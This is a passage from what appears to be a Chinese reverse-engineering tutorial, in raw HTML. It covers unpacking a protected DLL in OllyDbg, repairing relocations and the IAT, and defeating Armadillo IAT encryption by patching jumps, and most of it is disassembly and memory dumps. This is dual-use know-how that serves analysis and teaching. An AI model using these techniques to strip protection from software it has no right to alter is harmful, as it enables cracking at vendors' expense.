class="number">0</span>&gt;<span class="keyword">cmp</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x26C4</span>],<span class="number">0x0</span>        <span class="comment">; 重定位表为0？？</span></div><div class="line">029ACF9E    <span class="number">74</span> 6F           <span class="keyword">je</span> X029AD00F</div><div class="line">029ACFA0    83BD 78D9FFFF <span class="number">0</span>&gt;<span class="keyword">cmp</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x2688</span>],<span class="number">0x0</span></div><div class="line">029ACFA7    <span class="number">74</span> <span class="number">66</span>           <span class="keyword">je</span> X029AD00F</div><div class="line">029ACFA9    8B85 FCD7FFFF   <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x2804</span>]</div><div class="line">029ACFAF    8B8D 0CD8FFFF   <span class="keyword">mov</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x27F4</span>]</div><div class="line">029ACFB5    3B48 <span class="number">34</span>         <span class="keyword">cmp</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span>+<span class="number">0x34</span>]</div><div class="line">029ACFB8    <span class="number">74</span> <span class="number">55</span>           <span class="keyword">je</span> X029AD00F                             <span class="comment">; 重定位处理，此处需要跳过</span></div><div class="line">029ACFBA    FFB5 78D9FFFF   <span class="keyword">push</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x2688</span>]</div><div class="line">029ACFC0    8B85 0CD8FFFF   <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x27F4</span>]</div><div class="line">029ACFC6    <span class="number">0385</span> 3CD9FFFF   <span class="keyword">add</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x26C4</span>]</div><div class="line">029ACFCC    <span class="number">50</span>              <span class="keyword">push</span> <span class="built_in">eax</span></div><div class="line">029ACFCD    8B85 FCD7FFFF   <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x2804</span>]</div><div class="line">029ACFD3    FF70 <span class="number">34</span>         <span class="keyword">push</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span>+<span class="number">0x34</span>]</div><div class="line">029ACFD6    FFB5 0CD8FFFF   <span class="keyword">push</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x27F4</span>]</div><div class="line">029ACFDC    E8 3C150000     <span class="keyword">call</span> 029AE51D                            <span class="comment">; 处理重定位</span></div><div class="line">029ACFE1    83C4 <span class="number">10</span>         <span class="keyword">add</span> <span class="built_in">esp</span>,<span class="number">0x10</span></div><div class="line">029ACFE4    0FB6C0          <span class="keyword">movzx</span> <span class="built_in">eax</span>,<span class="built_in">al</span></div><div class="line">029ACFE7    85C0            <span class="keyword">test</span> <span class="built_in">eax</span>,<span class="built_in">eax</span></div><div class="line">029ACFE9    <span class="number">75</span> <span class="number">24</span>           <span class="keyword">jnz</span> X029AD00F</div><div class="line">029ACFEB    8B45 <span class="number">08</span>         <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>+<span class="number">0x8</span>]</div><div class="line">029ACFEE    8B00            <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span>]</div><div class="line">029ACFF0    C700 <span class="number">07000000</span>   <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span>],<span class="number">0x7</span></div><div class="line">029ACFF6    <span class="number">68</span> 50CB9B02     <span class="keyword">push</span> <span class="number">0x29BCB50</span>                           <span class="comment">; ASCII "Location CPG"</span></div><div class="line">029ACFFB    8B45 <span class="number">08</span>         <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>+<span class="number">0x8</span>]</div><div class="line">029ACFFE    FF70 <span class="number">04</span>         <span class="keyword">push</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span>+<span class="number">0x4</span>]</div><div class="line">029AD001    E8 <span class="number">24800000</span>     <span class="keyword">call</span> 029B502A                            <span class="comment">; jmp 到 msvcrt.strcpy</span></div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;此处提供另外一种方法，首先在内存窗口，在PE文件头下访问断点,然后shift+F9中断到029A9BC7,这里是DLL文件的文件头区域<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">Memory map, 条目 <span class="number">35</span></div><div class="line"> 地址=<span class="number">00</span>A20000</div><div class="line"> 大小=<span class="number">00001000</span> (<span class="number">4096.</span>)</div><div class="line"> 属主=EdrLib   <span class="number">00</span>A20000 (自身)</div><div class="line"> 区段=</div><div class="line"> 包含=PE 文件头</div><div class="line"> 类型=Imag <span class="number">01001002</span></div><div class="line"> 访问=R</div><div class="line"> 初始访问=RWE</div></pre></td></tr></table></figure></p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">029A9BC7    <span class="number">0348</span> 3C         <span class="keyword">add</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span>+<span class="number">0x3C</span>]</div><div class="line">029A9BCA    <span class="number">898D</span> FCD7FFFF   <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x2804</span>],<span class="built_in">ecx</span>        <span class="comment">; EdrLib.00A200D8</span></div><div class="line">029A9BD0    A1 FC009C02     <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="number">0x29C00FC</span>]</div><div class="line">029A9BD5    <span class="number">8985</span> B0AAFFFF   <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>+<span class="number">0xFFFFAAB0</span>],<span class="built_in">eax</span></div><div class="line">029A9BDB    8B85 B0AAFFFF   <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>+<span class="number">0xFFFFAAB0</span>]</div><div class="line">029A9BE1    <span class="number">8985</span> 0CD8FFFF   <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x27F4</span>],<span class="built_in">eax</span></div><div class="line">029A9BE7    8B85 FCD7FFFF   <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x2804</span>]</div><div class="line">029A9BED    8B40 <span class="number">50</span>         <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span>+<span class="number">0x50</span>]</div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着ctrl+s搜索如下指令<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">mov</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ecx</span>+C]</div><div class="line"><span class="keyword">add</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ecx</span>+<span class="number">8</span>]</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们先来跟一下。这里是为了获取pdata,reloc<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">029AFABD    3BCE            <span class="keyword">cmp</span> <span class="built_in">ecx</span>,<span class="built_in">esi</span>                              <span class="comment">; 和pdata比较</span></div><div class="line">029AFABF    <span class="number">73</span> <span class="number">11</span>           <span class="keyword">jnb</span> X029AFAD2</div><div class="line">029AFAC1    8B51 0C         <span class="keyword">mov</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ecx</span>+<span class="number">0xC</span>]</div><div class="line">029AFAC4    <span class="number">0351</span> <span class="number">08</span>         <span class="keyword">add</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ecx</span>+<span class="number">0x8</span>]</div><div class="line">029AFAC7    3BD0            <span class="keyword">cmp</span> <span class="built_in">edx</span>,<span class="built_in">eax</span></div><div class="line">029AFAC9    <span class="number">76</span> <span class="number">02</span>           <span class="keyword">jbe</span> X029AFACD</div><div class="line">029AFACB    8BC2            <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">edx</span></div><div class="line">029AFACD    83C1 <span class="number">28</span>         <span class="keyword">add</span> <span class="built_in">ecx</span>,<span class="number">0x28</span>                             <span class="comment">; next dir</span></div><div class="line">029AFAD0  ^ EB EB           <span class="keyword">jmp</span> X029AFABD</div><div class="line">029AFAD2    5E              <span class="keyword">pop</span> <span class="built_in">esi</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;此时，当我们遍历到了reloc的时候，也就是eac为reloc的时候，在信息窗口显示的数据就是reloc的RVA=6000。size=3B0<br><figure class="highlight dns"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ds:[<span class="number">00A20254</span>]=<span class="number">00006000</span>    edx=<span class="number">000058E0</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;绕过重定位表处理之后，直接在 EdrLib .text段上下F2断点，然后shitf+f9直达OEP，注意并不是在LoadDll.exe的text段，而是需要脱壳的DLL的text段下断点。<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Memory map, 条目 <span class="number">36</span></div><div class="line"> 地址=<span class="number">00</span>A21000</div><div class="line"> 大小=<span class="number">00003000</span> (<span class="number">12288.</span>)</div><div class="line"> 属主=EdrLib   <span class="number">00</span>A20000</div><div class="line"> 区段=.text</div><div class="line"> 类型=Imag <span class="number">01001002</span></div><div class="line"> 访问=R</div><div class="line"> 初始访问=RWE</div></pre></td></tr></table></figure></p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">00A211C9    <span class="number">55</span>              <span class="keyword">push</span> <span class="built_in">ebp</span></div><div class="line">00A211CA    8BEC            <span class="keyword">mov</span> <span class="built_in">ebp</span>,<span class="built_in">esp</span></div><div class="line">00A211CC    <span class="number">53</span>              <span class="keyword">push</span> <span class="built_in">ebx</span></div><div class="line">00A211CD    8B5D <span class="number">08</span>         <span class="keyword">mov</span> <span class="built_in">ebx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>+<span class="number">0x8</span>]</div><div class="line">00A211D0    <span class="number">56</span>              <span class="keyword">push</span> <span class="built_in">esi</span></div><div class="line">00A211D1    8B75 0C         <span class="keyword">mov</span> <span class="built_in">esi</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>+<span class="number">0xC</span>]</div><div class="line">00A211D4    <span class="number">57</span>              <span class="keyword">push</span> <span class="built_in">edi</span></div><div class="line">00A211D5    8B7D <span class="number">10</span>         <span class="keyword">mov</span> <span class="built_in">edi</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>+<span class="number">0x10</span>]</div><div class="line">00A211D8    85F6            <span class="keyword">test</span> <span class="built_in">esi</span>,<span class="built_in">esi</span></div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接下来就可以dump程序了，在LordPE<strong>目录</strong>中修改重定位信息。因为没有处理重定位表，所以只需要修复DLL原来的重定位表的RVA和大小就行了。<br><figure class="highlight maxima"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">RVA=<span class="number">6000</span></div><div class="line">SIZE=<span class="number">3B0</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;因为没有修改IAT表，所以IAT表的数据是正确的。所以直接Ctrl+M，选中.rdata处，双击，为了方便查看选择地址显示.可以判断起始地址为A24000，结束地址为A240C8,大小为C8<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="number">00</span>A24000  <span class="number">77</span>EF7F9D  GDI32.GetTextExtentPoint32W</div><div class="line"><span class="number">00</span>A24004  <span class="number">77</span>EF7EAC  GDI32.TextOutW</div><div class="line"><span class="number">00</span>A24008  <span class="number">77</span>EFBA3F  GDI32.TextOutA</div><div class="line"><span class="number">00</span>A2400C  <span class="number">77</span>F0C63D  GDI32.GetTextExtentPoint32A</div><div class="line"><span class="number">00</span>A24010  <span class="number">029970</span>A0</div><div class="line"><span class="number">00</span>A24014  <span class="number">7</span>C809A99  kernel32.lstrlenW</div><div class="line"><span class="number">00</span>A24018  <span class="number">7</span>C814B77  kernel32.FreeEnvironmentStringsW</div><div class="line"><span class="number">00</span>A2401C  <span class="number">7</span>C812FAD  kernel32.GetCommandLineA</div><div class="line"><span class="number">00</span>A24020  <span class="number">7</span>C81126A  kernel32.GetVersion</div><div class="line"><span class="number">00</span>A24024  <span class="number">7</span>C81CAFA  kernel32.ExitProcess</div><div class="line"><span class="number">00</span>A24028  <span class="number">7</span>C801E1A  kernel32.TerminateProcess</div><div class="line"><span class="number">00</span>A2402C  <span class="number">7</span>C80DE85  kernel32.GetCurrentProcess</div><div class="line"><span class="number">00</span>A24030  <span class="number">7</span>C8097B8  kernel32.GetCurrentThreadId</div><div class="line"><span class="number">00</span>A24034  <span class="number">7</span>C809C55  kernel32.TlsSetValue</div><div class="line"><span class="number">00</span>A24038  <span class="number">7</span>C812E2F  kernel32.TlsAlloc</div><div class="line"><span class="number">00</span>A2403C  <span class="number">7</span>C813767  kernel32.TlsFree</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接下有有一个很秀的操作，将我们获得从A24000-A240C8的IAT数据，复制到新打开的notepad中的404000-4040C8处.这叫借鸡生蛋。然后在ImportRCE中IAT的RVA填写404000，大小填写C8就好了<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="number">00404020</span>  <span class="number">6</span>A <span class="number">12</span> <span class="number">81</span> <span class="number">7</span>C FA CA <span class="number">81</span> <span class="number">7</span>C <span class="number">1</span>A <span class="number">1</span>E <span class="number">80</span> <span class="number">7</span>C <span class="number">85</span> DE <span class="number">80</span> <span class="number">7</span>C  j亅亅€|呣€|</div><div class="line"><span class="number">00404030</span>  B8 <span class="number">97</span> <span class="number">80</span> <span class="number">7</span>C <span class="number">55</span> <span class="number">9</span>C <span class="number">80</span> <span class="number">7</span>C <span class="number">2</span>F <span class="number">2</span>E <span class="number">81</span> <span class="number">7</span>C <span class="number">67</span> <span class="number">37</span> <span class="number">81</span> <span class="number">7</span>C  笚€|U渶|/.亅g7亅</div><div class="line"><span class="number">00404040</span>  D0 <span class="number">97</span> <span class="number">80</span> <span class="number">7</span>C <span class="number">27</span> CD <span class="number">80</span> <span class="number">7</span>C C9 <span class="number">2</span>F <span class="number">81</span> <span class="number">7</span>C E1 <span class="number">0</span>E <span class="number">81</span> <span class="number">7</span>C  袟€|'蛝|?亅?亅</div><div class="line"><span class="number">00404050</span>  F2 <span class="number">1</span>E <span class="number">80</span> <span class="number">7</span>C <span class="number">5</span>A <span class="number">13</span> <span class="number">93</span> <span class="number">7</span>C <span class="number">5</span>F B5 <span class="number">80</span> <span class="number">7</span>C D7 D6 <span class="number">81</span> <span class="number">7</span>C  ?€|Z搢_祤|字亅</div><div class="line"><span class="number">00404060</span>  <span class="number">46</span> BE <span class="number">80</span> <span class="number">7</span>C <span class="number">64</span> A1 <span class="number">80</span> <span class="number">7</span>C <span class="number">7</span>B CC <span class="number">81</span> <span class="number">7</span>C <span class="number">98</span> <span class="number">2</span>F <span class="number">81</span> <span class="number">7</span>C  F線|d|&#123;虂|?亅</div><div class="line"><span class="number">00404070</span>  <span class="number">88</span> <span class="number">0</span>F <span class="number">81</span> <span class="number">7</span>C <span class="number">46</span> <span class="number">2</span>C <span class="number">81</span> <span class="number">7</span>C <span class="number">74</span> <span class="number">9</span>B <span class="number">80</span> <span class="number">7</span>C <span class="number">0</span>D FF <span class="number">92</span> <span class="number">7</span>C  ?亅F,亅t泙|.抾</div><div class="line"><span class="number">00404080</span>  <span class="number">17</span> <span class="number">0</span>E <span class="number">81</span> <span class="number">7</span>C <span class="number">81</span> <span class="number">9</span>F <span class="number">80</span> <span class="number">7</span>C <span class="number">00</span> <span class="number">10</span> <span class="number">92</span> <span class="number">7</span>C E0 <span class="number">10</span> <span class="number">92</span> <span class="number">7</span>C  亅仧€|.抾?抾</div><div class="line"><span class="number">00404090</span>  A4 <span class="number">00</span> <span class="number">93</span> <span class="number">7</span>C <span class="number">06</span> <span class="number">2</span>F <span class="number">81</span> <span class="number">7</span>C A5 <span class="number">99</span> <span class="number">80</span> <span class="number">7</span>C <span class="number">37</span> <span class="number">28</span> <span class="number">81</span> <span class="number">7</span>C  ?搢/亅€|<span class="number">7</span>(亅</div><div class="line"><span class="number">004040</span>A0  E1 <span class="number">9</span>A <span class="number">80</span> <span class="number">7</span>C <span class="number">80</span> <span class="number">9</span>B <span class="number">93</span> <span class="number">7</span>C <span class="number">30</span> AE <span class="number">80</span> <span class="number">7</span>C <span class="number">7</span>B <span class="number">1</span>D <span class="number">80</span> <span class="number">7</span>C  釟€|€洆|<span class="number">0</span>畝|&#123;€|</div><div class="line"><span class="number">004040</span>B0  <span class="number">88</span> <span class="number">9</span>C <span class="number">80</span> <span class="number">7</span>C <span class="number">00</span> <span class="number">8</span>E <span class="number">83</span> <span class="number">7</span>C <span class="number">38</span> CD <span class="number">80</span> <span class="number">7</span>C <span class="number">24</span> <span class="number">8</span>A <span class="number">83</span> <span class="number">7</span>C  垳€|.巸|<span class="number">8</span>蛝|$妰|</div><div class="line"><span class="number">004040</span>C0  <span class="number">20</span> A5 <span class="number">80</span> <span class="number">7</span>C A5 AB <span class="number">94</span> <span class="number">7</span>C <span class="number">3</span>B C6 <span class="number">7</span>D <span class="number">1</span>B FF <span class="number">15</span> CC <span class="number">63</span>   |カ攟;苶蘡</div><div class="line"><span class="number">004040</span>D0  <span class="number">40</span> <span class="number">00</span> <span class="number">83</span> F8 <span class="number">3</span>F <span class="number">0</span>F <span class="number">85</span> A2 <span class="number">03</span> <span class="number">00</span> <span class="number">00</span> C7 <span class="number">45</span> FC FD FF  @.凐?參..荅</div><div class="line"><span class="number">004040E0</span>  FF FF E9 <span class="number">96</span> <span class="number">03</span> <span class="number">00</span> <span class="number">00</span> <span class="number">33</span> F6 A1 <span class="number">00</span> <span class="number">50</span> <span class="number">40</span> <span class="number">00</span> <span class="number">56</span> <span class="number">50</span>  闁.<span class="number">.3</span>觥.P@.VP</div></pre></td></tr></table></figure></p><h2 id="0x6-非常规方法应对"><a href="#0x6-非常规方法应对" class="headerlink" title="0x6 非常规方法应对"></a>0x6 非常规方法应对</h2><h3 id="0x6-1-应对IAT加密"><a href="#0x6-1-应对IAT加密" class="headerlink" title="0x6.1 应对IAT加密"></a>0x6.1 应对IAT加密</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这里使用了非常简单的Arm作为示范，只含有IAT加密，不涉及其他，第二常规方法下建议使用增强版OD。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通常规避IAT加密的方法就是Magic_Jmp,然后.text下断到OEP。这里前辈给出新方法。介绍一下。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先须要了解到Arm并不是对所有的API函数进行加密，前辈这里的思路是先直接到达OEP，在根据里面一直的函数地址寻找IAT地址，然后寻找出IAT中被加密的地方，下硬件断点。重新运行之后到达被修改的的地址，然后分析加密IAT的过程，使用jmp或者nop规避即可。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在.text下断，然后F9运行，程序到达OEP，只是IAT被加密了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">004010CC    55              push    ebp</div><div class="line">004010CD    8BEC            mov     ebp, esp</div><div class="line">004010CF    83EC 44         sub     esp, 44</div><div class="line">004010D2    56              push    esi</div><div class="line">004010D3    FF15 E4634000   call    dword ptr [4063E4]</div><div class="line">004010D9    8BF0            mov     esi, eax</div><div class="line">004010DB    8A00            mov     al, byte ptr [eax]</div><div class="line">004010DD    3C 22           cmp     al, 22</div><div class="line">004010DF    75 1B           jnz     short 004010FC</div><div class="line">004010E1    56              push    esi</div><div class="line">004010E2    FF15 F4644000   call    dword ptr [4064F4]               ; USER32.CharNextA</div><div class="line">004010E8    8BF0            mov     esi, eax</div><div class="line">004010EA    8A00            mov     al, byte ptr [eax]</div><div class="line">004010EC    84C0            test    al, al</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;大家应该都知道IID中所有函数应该是连续的，但是这些是不连续的，应该是被加密的。但是也说过其只是对IAT部分函数地址(有歧义自行理解)进行加密。但是IAT的RVA应该是一致的。所以将IAT的起始RVA=62E4，结束RVA=6524,大小应该为240，oep为4010cc记录下来。<br><figure class="highlight basic"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="number">0040645</span>C  <span class="number">77D3</span>C972  USER32.SetDlgItemTextA</div><div class="line"><span class="symbol">00406460 </span> <span class="number">77D5</span>A5E5  USER32.TabbedTextOutA</div><div class="line"><span class="symbol">00406464 </span> <span class="number">021</span>AB517</div><div class="line"><span class="symbol">00406468 </span> <span class="number">77D29849</span>  USER32.EnableWindow</div><div class="line"><span class="number">0040646</span>C  <span class="number">021</span>AA871</div><div class="line"><span class="symbol">00406470 </span> <span class="number">77D3</span>C2E7  USER32.SendDlgItemMessageA</div><div class="line"><span class="symbol">00406474 </span> <span class="number">77D2</span>AF1B  USER32.GetDlgCtrlID</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们在0040645C处下硬件断点，然后重新载入，接着按shitf+9，即可到达0218CF28处<br><figure class="highlight maxima"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="number">0218CF28</span>    <span class="number">8B85</span> 10D9FFFF   mov     eax, dword ptr [ebp-26F0]        ; PackEd.<span class="number">004062EC</span></div><div class="line"><span class="number">0218CF2E</span>    83C0 <span class="number">04</span>         add     eax, <span class="number">4</span></div><div class="line"><span class="number">0218CF31</span>    <span class="number">8985</span> 10D9FFFF   mov     dword ptr [ebp-26F0], eax</div><div class="line"><span class="number">0218CF37</span>  ^ E9 4DFCFFFF     jmp     <span class="number">0218CB89</span></div><div class="line"><span class="number">0218CF3C</span>    FF15 <span class="number">84721902</span>   call    dword ptr [<span class="number">2197284</span>]              ; kernel32.GetTickCount</div><div class="line"><span class="number">0218CF42</span>    <span class="number">2B85</span> A4D4FFFF   sub     eax, dword ptr [ebp-2B5C]</div><div class="line"><span class="number">0218CF48</span>    8B8D A8D4FFFF   mov     ecx, dword ptr [ebp-<span class="number">2B58</span>]</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着往下跟，在0218CD6B处发现比较一个，可以发现第一轮他是和RegCreateKeyA比较<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="number">0218</span>CD63    <span class="number">50</span>              push    eax</div><div class="line"><span class="number">0218</span>CD64    <span class="number">8</span>D85 <span class="number">68</span>C2FFFF   lea     eax, dword ptr [ebp<span class="number">-3</span>D98]</div><div class="line"><span class="number">0218</span>CD6A    <span class="number">50</span>              push    eax</div><div class="line"><span class="number">0218</span>CD6B    FF15 <span class="number">78731902</span>   call    dword ptr [<span class="number">2197378</span>]              ; msvcrt._stricmp</div><div class="line"><span class="number">0218</span>CD71    <span class="number">59</span>              pop     ecx</div><div class="line"><span class="number">0218</span>CD72    <span class="number">59</span>              pop     ecx</div><div class="line"><span class="number">0218</span>CD73    <span class="number">85</span>C0            test    eax, eax</div><div class="line"><span class="number">0218</span>CD75    <span class="number">75</span> <span class="number">11</span>           jnz     short <span class="number">0218</span>CD88</div></pre></td></tr></table></figure></p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="number">001294</span>D4   <span class="number">0012</span>AE7C  |s1 = <span class="string">"RegOpenKeyA"</span></div><div class="line"><span class="number">001294</span>D8   <span class="number">0012</span>AD6C  \s2 = <span class="string">"RegCreateKeyA"</span></div><div class="line"><span class="number">001294</span>DC   <span class="number">021</span>A0F88</div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;经过如下分析，我们可以知道0218CF1A处就是我们加密IAT的操作。同时也知道Arm只是针对部分IAT进行加密的。所以只需要修改之前在0218CD6B处的<code>jnz short 0218CD88</code>，或者位于0218CF18处的<code>jnb short 0218CF37</code>即可！<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">0218CF1A    8B85 10D9FFFF   <span 